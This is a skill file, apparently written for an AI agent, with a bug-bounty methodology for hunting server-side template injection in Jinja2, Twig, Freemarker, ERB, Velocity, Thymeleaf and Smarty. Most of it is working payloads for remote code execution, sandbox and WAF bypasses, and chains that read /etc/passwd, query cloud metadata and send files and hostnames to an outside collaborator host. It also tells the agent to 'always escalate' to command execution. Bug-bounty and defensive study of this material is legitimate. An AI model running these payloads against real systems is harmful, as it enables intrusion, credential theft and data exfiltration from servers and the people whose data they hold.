---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
sources: hackerone_public, field_recon, portswigger_research, synacktiv_research
report_count: 14
---

## When to Use

Use when the target has any endpoint that renders user-controlled input through a server-side template engine. SSTI is one of the fastest paths to RCE — detection is a single `{{7*7}}` and escalation typically requires one more payload. SSTI detection is reliable because template expressions evaluate BEFORE HTML encoding, so the result `49` appears in the rendered output even if the surrounding page is properly escaped.

**Triggering contexts:** email templates (order confirmations, password resets, welcome emails), PDF/report generators, CMS preview features (page builder previews, theme editors), error pages that reflect user input, profile bio/name/description fields rendered by server-side templates, URL path parameters reflected in templates, and inline translation strings with interpolation.

## Quick Reference

```bash
# Detection polyglot — try this in EVERY user-controlled field
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
# Expectation: 49 appears in the response (or 7777777 for Jinja2 string repetition)

# Fingerprint engine
{{7*'7'}}         # 7777777 = Jinja2 (Python), 49 = Twig (PHP)
${7*7}            # 49 = Freemarker, Velocity, Mako (all use ${...})
<%= 7*7 %>        # 49 = ERB (Ruby)
*{7*7}            # 49 = Spring Thymeleaf

# Blind RCE detection (OOB callback instead of output)
{{ lipsum__globals__.os.popen('nslookup $(whoami).COLLAB').read() }}  # Jinja2
```

## Step-by-Step Hunting Methodology

### Phase 1 — Detection & Fingerprinting

1. **Identify reflection points** — Every field where user input appears in rendered output: name fields, bio, email templates, error messages, URL parameters, search queries.

2. **Send polyglot probe** — Submit `{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}` in each candidate field. Look for `49` in the response body — this is a reliable signal because template expressions evaluate BEFORE HTML escaping.

3. **Engine fingerprinting** — Once SSTI is confirmed, determine the engine:
   - `{{7*'7'}}` → `7777777` = **Jinja2** (Python string repetition); `49` = **Twig** (PHP numeric coercion)
   - `${7*7}` → `49` = **Freemarker/Spring/Velocity/Mako**
   - `<%= 7*7 %>` → `49` = **ERB** (Ruby on Rails)
   - `*{7*7}` → `49` = **Thymeleaf** (Spring/Java)
   - `${7*7}` in header/cookie context → **Spring Boot** with sensitive properties via `${user.name}`

4. **Error-reveal technique** — Submit an intentionally malformed expression (`{{badger` without closing braces) — the error message often reveals the engine name, framework version, and file paths.

5. **Context analysis** — Determine if the injection is in HTML context, attribute context, JavaScript context, or blind (only the output is used, not reflected).

### Phase 2 — Escalation to RCE

Once the engine is fingerprinted, escalate using engine-specific RCE payloads:

**Jinja2 (Python/Flask/Django):**
```python
# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Class walker (if config is restricted)
{{''.__class__.__mro__[1].__subclasses__()}}

# Blind RCE with OOB
{{lipsum.__globals__['os'].popen('curl http://COLLAB/ssti-rce').read()}}

# File read
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# OOB callback
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("curl http://COLLAB/twig-rce")}}
```

**Freemarker (Java):**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# OOB
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"curl http://COLLAB/fm-rce")}
```

**ERB (Ruby on Rails):**
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read() %>
```

**Velocity (Java):**
```java
#set($str=$class.inspect("java.lang.String").split(""))
#set($rt=$class.inspect("java.lang.Runtime").getRuntime())
$rt.exec("id")
```

**Spring Boot / Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec("id")}
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
```

**Smarty (PHP):**
```php
{php}echo shell_exec("id");{/php}
{system('id')}
```

### Phase 3 — Blind SSTI Detection

When SSTI output isn't reflected but the template still evaluates (email templates, PDF generation), use OOB detection:

```bash
# Jinja2 — exfil via DNS
{{lipsum.__globals__.os.popen('nslookup $(whoami).COLLAB').read()}}

# Twig — exfil via HTTP
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("curl http://COLLAB/blind-ssti")}}

# Freemarker — exfil via URL
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(
  "".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),
  "curl http://COLLAB/blind-fm")}

# ERB — exfil via open3
<%= Open3.popen3('curl http://COLLAB/erb-blind').read %>
```

### Phase 4 — Chaining

```bash
# SSTI → RCE → internal network scan
{{lipsum.__globals__.os.popen('curl http://COLLAB/$(hostname)').read()}}

# SSTI → file exfil
{{lipsum.__globals__.os.popen('curl -F "file=@/etc/passwd" http://COLLAB/exfil').read()}}

# SSTI → cloud metadata
{{lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read()}}
```

## Attack Surface Signals

**URL/Sink Patterns:**
```
/profile/name, /preview, /render, /email-template, /invoice, /report
?name=, ?template=, ?content=, ?body=, ?message=, ?title=
/profile/settings/bio, /admin/email-templates/edit, /cms/preview
```

**Response/Error Signals:**
```
Error: "Template '{{user_input}}' not found"  → Twig (Symfony)
Error: "org.springframework.expression.spel"  → Spring/Thymeleaf
Error: "Method __construct not found"         → Smarty
Error: "Undefined variable: 7*7"              → Smarty
Response contains rendered math expression    → SSTI confirmed
```

**Tech Stack Signals:**
- `X-Powered-By: Express` + Node.js → Pug, EJS, Handlebars
- `X-Powered-By: Phusion Passenger` → Ruby ERB
- `Server: Apache` + `X-Powered-By: PHP` → Twig, Smarty
- `Server: Apache Tomcat` → Freemarker, Velocity, Thymeleaf
- Django/Flask → Jinja2 (default template engine)
- Email template editors, CMS page builders, PDF generation services

## Common Root Causes

1. **Trusting user input in template contexts** — Developers pass user-controlled strings into `render_template_string()` (Flask), `Template()` (Jinja2), `$twig->render()` (Symfony), or `str.format()` with template syntax without sandboxing.

2. **Email template rendering** — Order confirmations, password resets, welcome emails that interpolate user name/input into templates before sending. The SSTI is blind (emailed to user, not reflected in browser), making it harder to detect but equally exploitable.

3. **CMS preview/page builder features** — Drag-and-drop page builders that store template fragments and render them server-side. The preview endpoint is often the SSTI sink.

4. **Inline translation systems** — Rails `t()` helper with interpolation: `t('welcome', name: user_input)` marks translation strings as HTML-safe by default, enabling SSTI through locale keys.

5. **Error pages reflecting input** — 404 handlers that echo the path into a template, 500 error pages showing the error message in a template.

6. **Developer debug endpoints** — `/render`, `/template-test`, `/email-preview` left enabled in production.

## Bypass Techniques

**Defense:** Blacklisted characters (`{`, `}`, `$`)
**Bypass:** Try alternative syntaxes — Twig `{% ... %}`, Jinja2 `{% ... %}`, Freemarker `<#if ...>`, alternate delimiter syntax depending on engine configuration.

**Defense:** Sandboxed template engine
**Bypass:** Sandbox restrictions are often engine-specific and incomplete. For Jinja2 SandboxedEnvironment, try `{{lipsum.__globals__}}` — the `lipsum` function is accessible in the default globals. For Twig sandbox, try `{{_self.env.registerUndefinedFilterCallback("exec")}}`.

**Defense:** Output filtering / HTML encoding
**Bypass:** SSTI evaluation happens BEFORE HTML encoding — the expression result `49` appears even if the page escapes HTML. Use OOB/DNS callbacks for blind execution confirmation.

**Defense:** WAF blocking SSTI patterns
**Bypass:** Use alternative RCE payloads — Jinja2 `{% print(...) %}` instead of `{{ ... }}`, Freemarker `<#assign>` instead of `${ ... }`, or split payloads across parameters.

**Defense:** Length limits on input
**Bypass:** Use short payload primitives — Jinja2 `{{lipsum.__globals__.os.popen('id').read()}}` is ~50 chars. For longer chains, use POST bodies instead of GET parameters.

## Real Examples

**Scenario A — Email Template SSTI → RCE (E-commerce Platform)**
A major e-commerce platform's order confirmation email included the customer's name in a server-rendered Jinja2 template. The attacker registered with a username containing `{{config.__class__.__init__.__globals__['os'].popen('curl http://COLLAB/$(hostname)').read()}}`. When the order confirmation was generated and emailed, the template engine evaluated the expression — executing the system command and sending the hostname to the attacker's collaborator. Impact: RCE on the email rendering server, which had access to the full customer database and order processing pipeline.

**Scenario B — CMS Page Builder SSTI (Freemarker → RCE)**
A Java-based CMS allowed editors with limited privileges to preview page templates. The Freemarker template engine was configured to allow `${ ... }` expressions in template fragments. An editor crafted a template snippet containing `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, which executed when the preview was rendered. Impact: privilege escalation from editor to OS-level RCE on the CMS application server.

**Scenario C — PDF Generator SSTI (Blind ERB → RCE)**
A Ruby on Rails application generated PDF invoices using a server-side template. The invoice included the customer's name and address. An attacker submitted an address with `<%= system("curl -F 'data=@/etc/passwd' http://COLLAB/exfil") %>`. When the PDF was generated, the ERB template executed the command, exfiltrating the server's password file. Impact: full server compromise via a blind SSTI in the PDF generation pipeline.

## Related Skills

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.